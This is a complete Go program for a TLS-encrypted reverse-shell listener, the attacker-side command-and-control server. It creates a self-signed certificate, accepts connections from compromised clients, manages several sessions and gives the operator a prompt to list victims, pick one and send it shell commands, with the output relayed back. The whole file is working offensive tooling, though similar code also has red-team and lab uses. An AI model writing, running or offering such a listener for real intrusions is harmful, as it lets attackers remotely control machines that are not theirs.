package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

// generateSelfSignedCert creates a self-signed TLS certificate on the fly
func generateSelfSignedCert() (tls.Certificate, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate private key: %v", err)
	}

	notBefore := time.Now()
	notAfter := notBefore.Add(365 * 24 * time.Hour)

	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Organization:  []string{"Reverse Shell Listener"},
			CommonName:   "localhost",
		},
		NotBefore:             notBefore,
		NotAfter:              notAfter,
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to create certificate: %v", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to load certificate: %v", err)
	}

	return cert, nil
}

var (
	clientConnections = make(map[string]chan string)
	clientResponses   = make(map[string]chan string)
	mutex             sync.Mutex
)

// reverseShellHandler handles incoming client connections
func reverseShellHandler(conn net.Conn) {
	clientAddr := conn.RemoteAddr().String()
	log.Printf("[+] New client connected: %s", clientAddr)
	defer conn.Close()

	cmdChan := make(chan string, 10)
	respChan := make(chan string, 10)

	mutex.Lock()
	clientConnections[clientAddr] = cmdChan
	clientResponses[clientAddr] = respChan
	mutex.Unlock()

	defer func() {
		mutex.Lock()
		delete(clientConnections, clientAddr)
		delete(clientResponses, clientAddr)
		mutex.Unlock()
		close(cmdChan)
		close(respChan)
		log.Printf("[-] Client disconnected: %s", clientAddr)
	}()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Read responses from client
	go func() {
		var responseBuffer strings.Builder
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				log.Printf("Error reading from client: %v", err)
				return
			}
			
			responseBuffer.WriteString(line)
			
			// Check if we've reached the end of output marker
			if strings.Contains(line, "<<<END_OF_OUTPUT>>>") {
				fullResponse := responseBuffer.String()
				respChan <- fullResponse
				responseBuffer.Reset()
			}
		}
	}()

	// Wait for first client interaction instead of sending INFO automatically

	for {
		select {
		case cmd, ok := <-cmdChan:
			if !ok {
				return
			}
			fmt.Fprintf(writer, "%s\n", cmd)
			writer.Flush()
			
			if cmd == "exit" {
				return
			}
		case <-time.After(30 * time.Second):
			fmt.Fprintf(writer, "PING\n")
			writer.Flush()
		}
	}
}

func interactiveShell() {
	reader := bufio.NewReader(os.Stdin)
	
	fmt.Println("\n=== Reverse Shell Listener ===")
	fmt.Println("Commands:")
	fmt.Println("  list                 - List connected clients")
	fmt.Println("  use <client_id>      - Interact with a specific client")
	fmt.Println("  exit                 - Exit the listener")
	fmt.Println()

	var currentClient string

	for {
		if currentClient == "" {
			fmt.Print("listener> ")
		} else {
			fmt.Printf("shell[%s]> ", currentClient)
		}

		input, err := reader.ReadString('\n')
		if err != nil {
			// EOF or other error - exit gracefully
			return
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		command := parts[0]

		if currentClient == "" {
			switch command {
			case "list":
				mutex.Lock()
				if len(clientConnections) == 0 {
					fmt.Println("No clients connected")
				} else {
					fmt.Println("\nConnected Clients:")
					i := 1
					for addr := range clientConnections {
						fmt.Printf("  %d. %s\n", i, addr)
						i++
					}
					fmt.Println()
				}
				mutex.Unlock()

			case "use":
				if len(parts) < 2 {
					fmt.Println("Usage: use <client_id>")
					continue
				}
				clientInput := parts[1]
				mutex.Lock()
				
				var selectedAddr string
				var numIdx int
				if _, err := fmt.Sscanf(clientInput, "%d", &numIdx); err == nil {
					// It's a number, find the corresponding client
					var addrs []string
					for addr := range clientConnections {
						addrs = append(addrs, addr)
					}
					if numIdx > 0 && numIdx <= len(addrs) {
						selectedAddr = addrs[numIdx-1]
					}
				} else {
					// Treat as direct address
					selectedAddr = clientInput
				}
				
				if selectedAddr == "" || clientConnections[selectedAddr] == nil {
					fmt.Printf("Client not found: %s\n", clientInput)
					fmt.Println("Use 'list' to see connected clients")
					mutex.Unlock()
					continue
				}
				
				currentClient = selectedAddr
				fmt.Printf("Now interacting with: %s\n", selectedAddr)
				fmt.Println("Type 'background' to return to listener prompt")
				mutex.Unlock()

			}
		} else {
			if input == "background" || input == "bg" {
				fmt.Printf("Backgrounding session with %s\n", currentClient)
				currentClient = ""
				continue
			}

			mutex.Lock()
			cmdChan, exists := clientConnections[currentClient]
			respChan := clientResponses[currentClient]
			mutex.Unlock()

			if !exists {
				fmt.Println("Client disconnected")
				currentClient = ""
				continue
			}

			cmdChan <- input

			if input == "exit" {
				currentClient = ""
				continue
			}

			select {
			case response := <-respChan:
				// Response includes END_OF_OUTPUT marker, just print it
				fmt.Print(response)
				if !strings.HasSuffix(response, "\n") {
					fmt.Println()
				}
			case <-time.After(5 * time.Second):
				fmt.Println("(command sent, no response received)")
			}
		}
	}
}

func runListenerMain() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "Usage: %s <port> <network-interface>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s 8443 0.0.0.0\n", os.Args[0])
		os.Exit(1)
	}

	port := os.Args[1]
	networkInterface := os.Args[2]
	address := fmt.Sprintf("%s:%s", networkInterface, port)

	log.Println("Generating self-signed certificate...")
	cert, err := generateSelfSignedCert()
	if err != nil {
		log.Fatalf("Failed to generate certificate: %v", err)
	}
	log.Println("Certificate generated successfully")

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	log.Printf("Starting TLS listener on %s", address)
	
	listener, err := tls.Listen("tcp", address, tlsConfig)
	if err != nil {
		log.Fatalf("Failed to create TLS listener: %v", err)
	}
	defer listener.Close()

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("Error accepting connection: %v", err)
				continue
			}
			go reverseShellHandler(conn)
		}
	}()

	time.Sleep(500 * time.Millisecond)
	
	log.Println("Listener ready. Waiting for connections...")

	interactiveShell()
}

func main() {
	runListenerMain()
}
